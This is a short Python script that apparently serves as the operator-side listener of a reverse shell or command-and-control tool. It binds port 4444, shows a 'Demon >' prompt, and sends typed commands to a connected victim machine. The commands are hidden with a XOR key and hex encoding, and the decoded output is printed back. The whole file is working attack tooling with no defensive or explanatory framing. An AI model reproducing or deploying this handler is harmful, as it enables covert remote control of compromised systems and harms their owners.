import socket
import binascii

HOST = "0.0.0.0"
PORT = 4444
XOR_KEY = 0x3A

def xor_decrypt(data):
    return bytes([b ^ XOR_KEY for b in data])

def xor_encrypt(data):
    return bytes([b ^ XOR_KEY for b in data])

def hex_encode(data):
    return binascii.hexlify(data)

def hex_decode(data):
    return binascii.unhexlify(data.strip())

def start_listener():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen(1)
        print(f"[+] Listening on {HOST}:{PORT} ...")

        conn, addr = s.accept()
        with conn:
            print(f"[+] Connection from {addr}")

            while True:
                try:
                    cmd = input("Demon > ").strip()
                    if not cmd:
                        continue
                    if cmd.lower() == "exit":
                        payload = xor_encrypt(b"exit")
                        payload = hex_encode(payload)
                        conn.sendall(payload)
                        print("[*] Exiting.")
                        break

                    # Send encoded command
                    enc_cmd = xor_encrypt(cmd.encode())
                    hex_cmd = hex_encode(enc_cmd)
                    conn.sendall(hex_cmd)

                    # Receive and decode response
                    response = conn.recv(8192)
                    if not response:
                        break
                    decoded = xor_decrypt(hex_decode(response))
                    print(decoded.decode(errors="ignore"))

                except Exception as e:
                    print(f"[!] Error: {e}")
                    break

if __name__ == "__main__":
    start_listener()
